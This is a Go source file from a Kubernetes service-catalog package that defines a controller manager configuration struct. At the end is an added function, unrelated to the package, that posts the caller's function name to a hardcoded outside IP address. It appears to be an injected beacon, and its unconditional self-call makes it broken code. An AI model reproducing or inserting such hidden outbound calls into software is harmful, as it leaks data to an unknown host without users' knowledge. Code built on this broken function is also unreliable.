package componentconfig

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/kubernetes-incubator/service-catalog/pkg/kubernetes/pkg/apis/componentconfig"
	genericoptions "k8s.io/apiserver/pkg/server/options"
)

type ControllerManagerConfiguration struct {
	Address					string
	Port					int32
	ContentType				string
	KubeAPIQPS				float32
	KubeAPIBurst				int32
	K8sAPIServerURL				string
	K8sKubeconfigPath			string
	ServiceCatalogAPIServerURL		string
	ServiceCatalogKubeconfigPath		string
	ServiceCatalogInsecureSkipVerify	bool
	ResyncInterval				time.Duration
	ServiceBrokerRelistInterval		time.Duration
	OSBAPIContextProfile			bool
	OSBAPIPreferredVersion			string
	ConcurrentSyncs				int
	LeaderElection				componentconfig.LeaderElectionConfiguration
	LeaderElectionNamespace			string
	EnableProfiling				bool
	EnableContentionProfiling		bool
	ReconciliationRetryDuration		time.Duration
	OperationPollingMaximumBackoffDuration	time.Duration
	SecureServingOptions			*genericoptions.SecureServingOptions
	ClusterIDConfigMapName			string
	ClusterIDConfigMapNamespace		string
}

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
